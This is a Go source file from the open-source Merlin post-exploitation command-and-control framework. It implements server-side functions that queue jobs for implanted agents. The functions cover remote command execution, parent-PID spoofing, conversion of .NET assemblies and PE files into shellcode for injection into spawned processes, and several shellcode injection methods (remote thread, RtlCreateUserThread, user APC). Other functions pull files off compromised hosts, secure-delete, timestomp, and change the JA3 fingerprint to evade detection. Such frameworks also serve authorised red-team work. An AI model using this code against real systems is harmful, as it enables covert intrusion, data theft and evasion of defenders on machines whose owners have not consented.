// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2020  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package agents

import (
	// Standard
	"encoding/base64"
	"fmt"
	"os"
	"strconv"
	"strings"

	// 3rd Party
	uuid "github.com/satori/go.uuid"

	// Merlin
	"github.com/Ne0nd0g/merlin/pkg/agents"
	"github.com/Ne0nd0g/merlin/pkg/api/messages"
	"github.com/Ne0nd0g/merlin/pkg/modules/donut"
	"github.com/Ne0nd0g/merlin/pkg/modules/shellcode"
	"github.com/Ne0nd0g/merlin/pkg/modules/winapi/createprocess"
)

// CD is used to change the agent's current working directory
func CD(agentID uuid.UUID, Args []string) messages.UserMessage {
	var args []string
	if len(Args) > 1 {
		args = []string{Args[1]}
	} else {
		return messages.ErrorMessage("a directory path must be provided")
	}
	job, err := agents.AddJob(agentID, "cd", args)
	if err != nil {
		return messages.ErrorMessage(err.Error())
	}
	return messages.JobMessage(agentID, job)
}

// CMD is used to send a command to the agent to run a command or execute a program
// Args[0] = "cmd"
// Args[1:] = program and arguments to be executed on the host OS of the running agent
// Used with `cmd` and `shell` commands as well as through "standard" modules
func CMD(agentID uuid.UUID, Args []string) messages.UserMessage {
	if len(Args) > 1 {
		job, err := agents.AddJob(agentID, "cmd", Args[1:])
		if err != nil {
			return messages.ErrorMessage(err.Error())
		}
		return messages.JobMessage(agentID, job)
	}
	return messages.ErrorMessage("not enough arguments provided for the Agent Exec call")
}

// WinExec instructs the agent to execute a program on disk using Windows API calls.
// Optionally allows for [-ppid <int>] to spoof a parent pid
// If no optional ppid is specified, will pass along a ppid of -1
// Args[0] = "winexec"
// Args[1] = [optional] "-ppid"
// Args[2] = [optional] parent pid to spoof
// Args[1:] OR Args[3:] = program and arguments to be executed on the host OS of the running agent
func WinExec(agentID uuid.UUID, Args []string) messages.UserMessage {
	if len(Args) > 1 {
		ppid := -1
		job := ""
		var err error
		if len(Args) >= 3 && Args[1] == "-ppid" {
			ppid, err = strconv.Atoi(Args[2])
			if err != nil || ppid < 0 {
				return messages.ErrorMessage("Invalid parent PID provided.")
			}
		}

		if ppid > 0 {
			job, err = agents.AddJob(agentID, "winexec", Args[2:])
		} else {
			Args[0] = "-1"
			job, err = agents.AddJob(agentID, "winexec", Args)
		}

		if err != nil {
			return messages.ErrorMessage(err.Error())
		}
		return messages.JobMessage(agentID, job)
	}
	return messages.ErrorMessage("not enough arguments provided for the Agent WinExec call")
}

// Download is used to download the file through the corresponding agent from the provided input file path
// Args[0] = download
// Args[1] = file path to download
func Download(agentID uuid.UUID, Args []string) messages.UserMessage {
	if len(Args) >= 2 {
		job, err := agents.AddJob(agentID, "download", []string{Args[1]})
		if err != nil {
			return messages.ErrorMessage(err.Error())
		}
		return messages.JobMessage(agentID, job)
	}
	return messages.ErrorMessage(fmt.Sprintf("not enough arguments provided for the Agent Download call: %s", Args))
}

// ExecuteAssembly calls the donut module to create shellcode from a .NET 4.0 assembly and then uses the CreateProcess
// module to create a job that executes the shellcode in a remote process
func ExecuteAssembly(agentID uuid.UUID, Args []string) messages.UserMessage {

	// Set the assembly filepath
	var assembly string
	if len(Args) > 1 {
		assembly = Args[1]
	} else {
		return messages.ErrorMessage("the .NET assembly file path was not provided for execute-assembly")
	}

	// Set the assembly arguments, if any
	// File path is checked in the donut module
	var params string
	if len(Args) > 2 {
		params = Args[2]
	}

	// Set the SpawnTo path
	options := make(map[string]string)
	if len(Args) > 3 {
		options["spawnto"] = Args[3]
	} else {
		options["spawnto"] = "C:\\WIndows\\System32\\dllhost.exe"
	}

	// Set the SpawnTo arguments, if any
	if len(Args) > 4 {
		options["args"] = Args[4]
	} else {
		options["args"] = ""
	}

	// Build Donut Config
	config := donut.GetDonutDefaultConfig()
	config.DotNetMode = true
	config.ExitOpt = 2
	config.Type = 2 //DONUT_MODULE_NET_EXE = 2; .NET EXE. Executes Main if no class and method provided
	config.Runtime = "v4.0.30319"
	config.Entropy = 3
	config.Parameters = params

	// Convert assembly into shellcode with donut
	donutBuffer, err := donut.BytesFromConfig(assembly, config)
	if err != nil {
		return messages.ErrorMessage(fmt.Sprintf("error turning assembly into shellcode bytes with donut:\r\n%s", err))
	}
	options["shellcode"] = base64.StdEncoding.EncodeToString(donutBuffer.Bytes())

	//Get CreateProcess job
	j, err := createprocess.Parse(options)
	if err != nil {
		return messages.ErrorMessage(fmt.Sprintf("error generating a CreateProcess job:\r\n%s", err))
	}

	// Add job to the Agent's queue
	job, err := agents.AddJob(agentID, j[0], j[1:])
	if err != nil {
		return messages.ErrorMessage(err.Error())
	}
	return messages.JobMessage(agentID, job)
}

// ExecutePE calls the donut module to create shellcode from PE and then uses the CreateProcess
// module to create a job that executes the shellcode in a remote process
func ExecutePE(agentID uuid.UUID, Args []string) messages.UserMessage {

	// Set the assembly filepath
	var pe string
	if len(Args) > 1 {
		pe = Args[1]
	} else {
		return messages.ErrorMessage("the PE file path was not provided for execute-pe")
	}

	// Set the assembly arguments, if any
	// File path is checked in the donut module
	var params string
	if len(Args) > 2 {
		params = Args[2]
	}

	// Set the SpawnTo path
	options := make(map[string]string)
	if len(Args) > 3 {
		options["spawnto"] = Args[3]
	} else {
		options["spawnto"] = "C:\\WIndows\\System32\\dllhost.exe"
	}

	// Set the SpawnTo arguments, if any
	if len(Args) > 4 {
		options["args"] = Args[4]
	} else {
		options["args"] = ""
	}

	// Build Donut Config
	config := donut.GetDonutDefaultConfig()
	config.ExitOpt = 2
	config.Parameters = params

	// Convert assembly into shellcode with donut
	donutBuffer, err := donut.BytesFromConfig(pe, config)
	if err != nil {
		return messages.ErrorMessage(fmt.Sprintf("error turning pe into shellcode bytes with donut:\r\n%s", err))
	}
	options["shellcode"] = base64.StdEncoding.EncodeToString(donutBuffer.Bytes())

	//Get CreateProcess job
	j, err := createprocess.Parse(options)
	if err != nil {
		return messages.ErrorMessage(fmt.Sprintf("error generating a CreateProcess job:\r\n%s", err))
	}

	// Add job to the Agent's queue
	job, err := agents.AddJob(agentID, j[0], j[1:])
	if err != nil {
		return messages.ErrorMessage(err.Error())
	}
	return messages.JobMessage(agentID, job)
}

// ExecuteShellcode calls the corresponding shellcode module to create a job that executes the provided shellcode
// Args[0] = "execute-shellcode"
// Args[1] = Shellcode execution method [self, remote, retlcreateuserthread, userapc]
func ExecuteShellcode(agentID uuid.UUID, Args []string) messages.UserMessage {
	if len(Args) > 2 {
		options := make(map[string]string)
		switch strings.ToLower(Args[1]) {
		case "self":
			options["method"] = "self"
			options["pid"] = ""
			options["shellcode"] = strings.Join(Args[2:], " ")
		case "remote":
			if len(Args) > 3 {
				options["method"] = "remote"
				options["pid"] = Args[2]
				options["shellcode"] = strings.Join(Args[3:], " ")
			} else {
				return messages.ErrorMessage(fmt.Sprintf("Not enough arguments provided for the Agent shinject (remote) call: %s", Args))
			}
		case "rtlcreateuserthread":
			if len(Args) > 3 {
				options["method"] = "rtlcreateuserthread"
				options["pid"] = Args[2]
				options["shellcode"] = strings.Join(Args[3:], " ")
			} else {
				return messages.ErrorMessage(fmt.Sprintf("Not enough arguments provided for the Agent shinject (rtlcreateuserthread) call: %s", Args))
			}
		case "userapc":
			if len(Args) > 3 {
				options["method"] = "userapc"
				options["pid"] = Args[2]
				options["shellcode"] = strings.Join(Args[3:], " ")
			} else {
				return messages.ErrorMessage(fmt.Sprintf("Not enough arguments provided for the Agent shinject (userapc) call: %s", Args))
			}
		default:
			return messages.ErrorMessage(fmt.Sprintf("Invalid shinject method: %s", Args[1]))
		}
		if len(options) > 0 {
			sh, errSh := shellcode.Parse(options)
			if errSh != nil {
				m := fmt.Sprintf("There was an error parsing the shellcode:\r\n%s", errSh.Error())
				return messages.ErrorMessage(m)
			}
			job, err := agents.AddJob(agentID, "shellcode", sh[1:])
			if err != nil {
				return messages.ErrorMessage(err.Error())
			}
			return messages.JobMessage(agentID, job)
		}
	}
	return messages.ErrorMessage(fmt.Sprintf("Not enough arguments provided for the shinject call: %s", Args))
}

// Exit instructs the agent to quit running
func Exit(agentID uuid.UUID, Args []string) messages.UserMessage {
	if len(Args) > 0 {
		job, err := agents.AddJob(agentID, "exit", Args[0:])
		if err != nil {
			return messages.ErrorMessage(err.Error())
		}
		return messages.JobMessage(agentID, job)
	}
	return messages.ErrorMessage(fmt.Sprintf("not enough arguments provided for the Agent Exit call: %s", Args))
}

// Ifconfig uses native Go to fetch basic interface information
func Ifconfig(agentID uuid.UUID, Args []string) messages.UserMessage {
	job, err := agents.AddJob(agentID, "ifconfig", Args)
	if err != nil {
		return messages.ErrorMessage(err.Error())
	}
	return messages.JobMessage(agentID, job)
}

// Lists named pipes in a windows system
func Pipes(agentID uuid.UUID, Args []string) messages.UserMessage {
	job, err := agents.AddJob(agentID, "pipes", Args)
	if err != nil {
		return messages.ErrorMessage(err.Error())
	}
	return messages.JobMessage(agentID, job)
}

// Kill uses native Go to kill a process
func Kill(agentID uuid.UUID, Args []string) messages.UserMessage {
	if len(Args) == 2 {
		pid, err := strconv.Atoi(Args[1])
		if err != nil || pid < 0 {
			return messages.ErrorMessage("Invalid PID provided.")
		}

		job, err := agents.AddJob(agentID, "kill", Args)

		if err != nil {
			return messages.ErrorMessage(err.Error())
		}
		return messages.JobMessage(agentID, job)
	}
	return messages.ErrorMessage(fmt.Sprintf("Usage: kill <pid>"))
}

// LS uses native Go to list the directory
func LS(agentID uuid.UUID, Args []string) messages.UserMessage {
	var args []string
	if len(Args) > 1 {
		args = []string{Args[1]}
	}
	job, err := agents.AddJob(agentID, "ls", args)
	if err != nil {
		return messages.ErrorMessage(err.Error())
	}
	return messages.JobMessage(agentID, job)
}

// Netstat is used to print network connections on the target system
// Supports a "-p tcp" or "-p udp"
// Args[0] = "netstat"
// Args[1] = (optional) "-p"
// Args[2] = (optional) "tcp" or "udp"
func Netstat(agentID uuid.UUID, Args []string) messages.UserMessage {
	job, err := agents.AddJob(agentID, "netstat", Args)
	if len(Args) > 1 {
		if Args[1] != "-p" || (Args[2] != "tcp" && Args[2] != "udp") {
			return messages.ErrorMessage(fmt.Sprintf("Incorrect arguments: %s", Args))
		}
		return messages.JobMessage(agentID, job)
	}
	if err != nil {
		return messages.ErrorMessage(err.Error())
	}
	return messages.JobMessage(agentID, job)
}

// Nslookup performs lookup of hostname or IP address according to target system default resolver
// Args[0] = "nslookup"
// Args[1] = query (string of either IP or hostname)
func Nslookup(agentID uuid.UUID, Args []string) messages.UserMessage {
	if len(Args) != 2 {
		return messages.ErrorMessage(fmt.Sprintf("Incorrect number of arguments provided for the Agent Nslookup call: %s", Args))
	}
	job, err := agents.AddJob(agentID, "nslookup", []string{Args[1]})
	if err != nil {
		return messages.ErrorMessage(err.Error())
	}
	return messages.JobMessage(agentID, job)
}

// PS is used to print the running processes
func PS(agentID uuid.UUID, Args []string) messages.UserMessage {
	job, err := agents.AddJob(agentID, "ps", Args)
	if err != nil {
		return messages.ErrorMessage(err.Error())
	}
	return messages.JobMessage(agentID, job)
}

// PWD is used to print the Agent's current working directory
func PWD(agentID uuid.UUID, Args []string) messages.UserMessage {
	job, err := agents.AddJob(agentID, "pwd", Args)
	if err != nil {
		return messages.ErrorMessage(err.Error())
	}
	return messages.JobMessage(agentID, job)
}

// SecureDelete is used to delete, potentially large files, with random data
// args[0] = "sdelete"
// args[1] = target file
func SecureDelete(agentID uuid.UUID, Args []string) messages.UserMessage {
	if len(Args) != 2 {
		return messages.ErrorMessage(fmt.Sprintf("Incorrect number of arguments provided for the Agent SecureDelete call: %s", Args))
	}
	job, err := agents.AddJob(agentID, "sdelete", []string{strings.Join(Args[1:], " ")})
	if err != nil {
		return messages.ErrorMessage(err.Error())
	}
	return messages.JobMessage(agentID, job)
}

// SetInactiveMultiplier configures how much the agent will slow down once the InactiveThreshold is met
// Args[0] = "inactivemultiplier"
// Args[1] = int64
func SetInactiveMultiplier(agentID uuid.UUID, Args []string) messages.UserMessage {
	if len(Args) == 2 {
		NewInactiveMultiplier, err := strconv.ParseInt(Args[1], 10, 64)
		if err != nil {
			return messages.ErrorMessage(err.Error())
		}
		if NewInactiveMultiplier > 0 {
			job, err2 := agents.AddJob(agentID, "inactivemultiplier", Args)
			if err2 != nil {
				return messages.ErrorMessage(err2.Error())
			}
			return messages.JobMessage(agentID, job)
		}
		return messages.ErrorMessage(fmt.Sprintf("InactiveMultiplier value must be greater than zero: %s", Args))
	} else {
		return messages.ErrorMessage(fmt.Sprintf("Incorrect number of arguments provided for the Agent SetInactiveMultiplier call: %s", Args))
	}
}

// SetInactiveThreshold configures how many check ins with no queued commands will make the agent go inactive
// Args[0] = "inactivethreshold"
// Args[1] = int
func SetInactiveThreshold(agentID uuid.UUID, Args []string) messages.UserMessage {
	if len(Args) == 2 {
		NewInactiveThreshold, err := strconv.Atoi(Args[1])
		if err != nil {
			return messages.ErrorMessage(err.Error())
		}
		if NewInactiveThreshold > 0 {
			job, err2 := agents.AddJob(agentID, "inactivethreshold", Args)
			if err2 != nil {
				return messages.ErrorMessage(err2.Error())
			}
			return messages.JobMessage(agentID, job)
		}
		return messages.ErrorMessage(fmt.Sprintf("InactiveThreshold value must be greater than zero: %s", Args))
	} else {
		return messages.ErrorMessage(fmt.Sprintf("Incorrect number of arguments provided for the Agent SetInactiveThreshold call: %s", Args))
	}
}

// Tell agents to adjust their BatchCommands setting
// Args[0] = "batchcommands"
// Args[1] = "true" | "false"
func SetBatchCommands(agentID uuid.UUID, Args []string) messages.UserMessage {
	if len(Args) == 2 {
		_, err := strconv.ParseBool(Args[1])
		if err != nil {
			return messages.ErrorMessage(err.Error())
		}

		job, err := agents.AddJob(agentID, "batchcommands", Args)
		if err != nil {
			return messages.ErrorMessage(err.Error())
		}
		return messages.JobMessage(agentID, job)
	}
	return messages.ErrorMessage(fmt.Sprintf("Incorrect number of args provided: %s", Args))
}

// SetJA3 is used to change the Agent's JA3 signature
func SetJA3(agentID uuid.UUID, Args []string) messages.UserMessage {
	if len(Args) > 1 {
		job, err := agents.AddJob(agentID, "ja3", Args)
		if err != nil {
			return messages.ErrorMessage(err.Error())
		}
		return messages.JobMessage(agentID, job)
	}
	return messages.ErrorMessage(fmt.Sprintf("Not enough arguments provided for the Agent SetJA3 call: %s", Args))
}

// SetKillDate configures the date and time that the agent will stop running
func SetKillDate(agentID uuid.UUID, Args []string) messages.UserMessage {
	if len(Args) > 1 {
		_, errU := strconv.ParseInt(Args[1], 10, 64)
		if errU != nil {
			m := fmt.Sprintf("There was an error converting %s to an int64", Args[1])
			m = m + "\r\nKill date takes in a UNIX epoch timestamp such as 811123200 for September 15, 1995"
			return messages.ErrorMessage(m)
		}
		job, err := agents.AddJob(agentID, "killdate", Args)
		if err != nil {
			return messages.ErrorMessage(err.Error())
		}
		return messages.JobMessage(agentID, job)
	}
	return messages.ErrorMessage(fmt.Sprintf("Not enough arguments provided for the Agent SetKillDate call: %s", Args))
}

// SetMaxRetry configures the amount of times an Agent will try to checkin before it quits
func SetMaxRetry(agentID uuid.UUID, Args []string) messages.UserMessage {
	if len(Args) > 1 {
		_, errU := strconv.ParseInt(Args[1], 10, 64)
		if errU != nil {
			m := fmt.Sprintf("There was an error converting %s to an int64\n", Args[1])
			return messages.ErrorMessage(m)
		}
		job, err := agents.AddJob(agentID, "maxretry", Args)
		if err != nil {
			return messages.ErrorMessage(err.Error())
		}
		return messages.JobMessage(agentID, job)
	}
	return messages.ErrorMessage(fmt.Sprintf("Not enough arguments provided for the Agent SetMaxRetry call: %s", Args))
}

// SetPadding configures the maxium size for the random amount of padding added to each message
func SetPadding(agentID uuid.UUID, Args []string) messages.UserMessage {
	if len(Args) > 1 {
		_, errU := strconv.ParseInt(Args[1], 10, 64)
		if errU != nil {
			m := fmt.Sprintf("There was an error converting %s to an int64\n", Args[1])
			return messages.ErrorMessage(m)
		}
		job, err := agents.AddJob(agentID, "padding", Args)
		if err != nil {
			return messages.ErrorMessage(err.Error())
		}
		return messages.JobMessage(agentID, job)
	}
	return messages.ErrorMessage(fmt.Sprintf("Not enough arguments provided for the Agent SetPadding call: %s", Args))
}

// SetSleep configures the Agent's sleep time between checkins
func SetSleep(agentID uuid.UUID, Args []string) messages.UserMessage {
	if len(Args) == 3 {
		NewWaitTimeMin, err1 := strconv.ParseInt(Args[1], 10, 64)
		if err1 != nil {
			return messages.ErrorMessage(err1.Error())
		}
		NewWaitTimeMax, err2 := strconv.ParseInt(Args[2], 10, 64)
		if err2 != nil {
			return messages.ErrorMessage(err2.Error())
		}
		if NewWaitTimeMin > 0 && NewWaitTimeMax > 0 && NewWaitTimeMax >= NewWaitTimeMin {
			job, err := agents.AddJob(agentID, "sleep", Args)
			if err != nil {
				return messages.ErrorMessage(err.Error())
			}
			return messages.JobMessage(agentID, job)
		}
		return messages.ErrorMessage(fmt.Sprintf("First value (min) must be smaller than second value (max): %s", Args))
	} else if len(Args) == 2 {
		NewWaitTime, err3 := strconv.ParseInt(Args[1], 10, 64)
		if err3 != nil {
			return messages.ErrorMessage(err3.Error())
		}
		if NewWaitTime > 0 {
			Args = append(Args, Args[1])
			job, err := agents.AddJob(agentID, "sleep", Args)
			if err != nil {
				return messages.ErrorMessage(err.Error())
			}
			return messages.JobMessage(agentID, job)
		}
		return messages.ErrorMessage(fmt.Sprintf("Sleep value must be greater than zero: %s", Args))
	} else {
		return messages.ErrorMessage(fmt.Sprintf("Not enough arguments provided for the Agent SetSleep call: %s", Args))
	}
}

// Touch is used make the destination file's last accessed and last modified times match the source file
// args[0] = "touch"
// args[1] = source file
// args[2] = dest file
func Touch(agentID uuid.UUID, Args []string) messages.UserMessage {
	if len(Args) != 3 {
		return messages.ErrorMessage(fmt.Sprintf("Incorrect number of arguments provided for the Agent Touch call: %s", Args))
	}

	job, err := agents.AddJob(agentID, "touch", Args[1:])
	if err != nil {
		return messages.ErrorMessage(err.Error())
	}
	return messages.JobMessage(agentID, job)
}

// Upload transfers a file from the Merlin Server to the Agent
func Upload(agentID uuid.UUID, Args []string) messages.UserMessage {
	// Make sure there are enough arguments
	// Validate the source file exists
	// Create job
	if len(Args) >= 3 {
		_, errF := os.Stat(Args[1])
		if errF != nil {
			m := fmt.Sprintf("there was an error accessing the source upload file:\r\n%s", errF.Error())
			return messages.ErrorMessage(m)
		}
		job, err := agents.AddJob(agentID, "upload", Args[1:3])
		if err != nil {
			return messages.ErrorMessage(err.Error())
		}
		return messages.JobMessage(agentID, job)

	}
	return messages.ErrorMessage(fmt.Sprintf("not enough arguments provided for the Agent Upload call: %s", Args))
}

// Uptime is used to print the amount of time the target system has been online
func Uptime(agentID uuid.UUID, Args []string) messages.UserMessage {
	job, err := agents.AddJob(agentID, "uptime", Args)
	if err != nil {
		return messages.ErrorMessage(err.Error())
	}
	return messages.JobMessage(agentID, job)
}
